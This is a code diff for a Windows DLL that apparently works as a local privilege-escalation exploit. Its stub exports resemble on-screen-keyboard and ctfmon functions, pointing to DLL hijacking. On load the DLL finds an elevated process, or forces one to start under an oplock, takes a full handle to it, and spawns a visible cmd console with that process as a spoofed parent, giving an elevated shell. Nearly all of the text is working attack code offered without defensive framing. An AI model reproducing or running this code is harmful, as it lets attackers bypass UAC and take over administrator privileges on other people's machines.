@@ -12,6 +12,10 @@ __declspec(dllexport) void UninitializeOSKSupport()
 {
 }
 
+__declspec(dllexport) void DoMsCtfMonitor()
+{
+}
+
 static BOOL CreateProcessWithParentW(WCHAR* cmdline, HANDLE parent, DWORD dwFlags, WORD wShow, PROCESS_INFORMATION* pi)
 {
 	SIZE_T ptsize = 0;
@@ -91,7 +95,7 @@ static HANDLE GetHwndFullProcessHandle(HWND hwnd)
 	return dup;
 }
 
-static BOOL EnumElevatedWindows(HWND hwnd, LPARAM lparam)
+static BOOL EnumElevatedProcessHandle(HWND hwnd, LPARAM lparam)
 {
 	DWORD pid = 0;
 	HANDLE process = NULL;
@@ -126,25 +130,30 @@ static BOOL EnumElevatedWindows(HWND hwnd, LPARAM lparam)
 		return TRUE;
 	}
 	CloseHandle(token);
-	if (elevtype == TokenElevationTypeFull)
+	if (elevtype != TokenElevationTypeFull)
 	{
-		*(HWND*)lparam = hwnd;
+		return TRUE;
+	}
+	process = GetHwndFullProcessHandle(hwnd);
+	if (process)
+	{
+		*(HANDLE*)lparam = process;
 		return FALSE;
 	}
 	return TRUE;
 }
 
-static HWND FindFirstElevatedWindow()
+static HANDLE FindFirstElevatedProcessHandle()
 {
-	HWND hwnd = NULL;
-	EnumWindows((WNDENUMPROC)EnumElevatedWindows, (LPARAM)&hwnd);
-	return hwnd;
+	HANDLE process = NULL;
+	EnumWindows((WNDENUMPROC)EnumElevatedProcessHandle, (LPARAM)&process);
+	return process;
 }
 
 static BOOL CheckUIAccessPermissions()
 {
 	HANDLE token = NULL;
-	BYTE tmlbuf[sizeof(TOKEN_MANDATORY_LABEL) + sizeof(SID)];
+	BYTE tmlbuf[sizeof(TOKEN_MANDATORY_LABEL) + sizeof(SID)] = { 0 };
 	TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)&tmlbuf[0];
 	DWORD uiaccess = 0;
 	DWORD* integrity = NULL;
@@ -242,7 +251,6 @@ static BOOL StopBackupLockedElevatedProcess(POPLOCK_FILE_CONTEXT ofc)
 
 static BOOL StartElevatedCmd()
 {
-	HWND hwnd = NULL;
 	HANDLE process = NULL;
 	PROCESS_INFORMATION pi = { 0 };
 	OPLOCK_FILE_CONTEXT ofc = { 0 };
@@ -250,42 +258,35 @@ static BOOL StartElevatedCmd()
 	BOOL ret = FALSE;
 	int i = 0;
 
-	if (CheckUIAccessPermissions())
+	memset(&ofc, 0, sizeof(ofc));
+	ofc.len = sizeof(ofc);
+	ofc.file = INVALID_HANDLE_VALUE;
+	process = FindFirstElevatedProcessHandle();
+	if (!process)
 	{
-		memset(&ofc, 0, sizeof(ofc));
-		ofc.len = sizeof(ofc);
-		ofc.file = INVALID_HANDLE_VALUE;
-		hwnd = FindFirstElevatedWindow();
-		if (!hwnd)
+		if (StartBackupLockedElevatedProcess(&ofc))
 		{
-			if (StartBackupLockedElevatedProcess(&ofc))
+			for (i = 0; i < 5000; i += 500)
 			{
-				for (i = 0; i < 5000; i += 500)
-				{
-					Sleep(500);
-					hwnd = FindFirstElevatedWindow();
-				}
+				Sleep(500);
+				process = FindFirstElevatedProcessHandle();
 			}
 		}
-		if (hwnd)
+	}
+	if (process)
+	{
+		memset(&pi, 0, sizeof(pi));
+		ret = CreateProcessWithParentW(cmdline, process, CREATE_NEW_CONSOLE, SW_SHOW, &pi);
+		if (ret)
 		{
-			memset(&pi, 0, sizeof(pi));
-			process = GetHwndFullProcessHandle(hwnd);
-			if (process)
-			{
-				ret = CreateProcessWithParentW(cmdline, process, CREATE_NEW_CONSOLE, SW_SHOW, &pi);
-				if (ret)
-				{
-					CloseHandle(pi.hThread);
-					CloseHandle(pi.hProcess);
-				}
-				CloseHandle(process);
-			}
+			CloseHandle(pi.hThread);
+			CloseHandle(pi.hProcess);
 		}
-		if (ofc.file != INVALID_HANDLE_VALUE)
-		{
-			StopBackupLockedElevatedProcess(&ofc);
-		}
+		CloseHandle(process);
+	}
+	if (ofc.file != INVALID_HANDLE_VALUE)
+	{
+		StopBackupLockedElevatedProcess(&ofc);
 	}
 	return ret;
 }
@@ -331,9 +332,12 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-		HideMainWindow();
-		exitcode = !StartElevatedCmd();
-		ExitProcess(exitcode);
+		if (CheckUIAccessPermissions())
+		{
+			HideMainWindow();
+			exitcode = !StartElevatedCmd();
+			ExitProcess(exitcode);
+		}
         break;
     case DLL_THREAD_ATTACH:
         break;
